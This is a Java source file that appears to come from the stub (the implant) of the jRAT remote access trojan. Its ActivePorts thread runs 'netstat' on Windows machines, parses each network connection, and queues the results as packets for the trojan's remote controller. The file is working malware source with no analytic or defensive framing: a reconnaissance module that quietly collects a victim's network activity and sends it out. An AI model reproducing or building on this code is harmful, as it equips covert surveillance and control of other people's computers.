package io.jrat.stub;

import io.jrat.common.OperatingSystem;
import io.jrat.stub.packets.outgoing.Packet51ActivePort;

import java.io.BufferedReader;
import java.io.InputStreamReader;


public class ActivePorts extends Thread {

	public void run() {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			try {
				Process p = Runtime.getRuntime().exec("netstat");
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
				reader.readLine();
				reader.readLine();
				reader.readLine();
				reader.readLine();

				String line;

				while ((line = reader.readLine()) != null) {
					line = line.trim().replaceAll(" +", " ");

					String[] args = line.split(" ");

					Connection.addToSendQueue(new Packet51ActivePort(args[0], args[1], args[2], args[3]));
				}
				reader.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
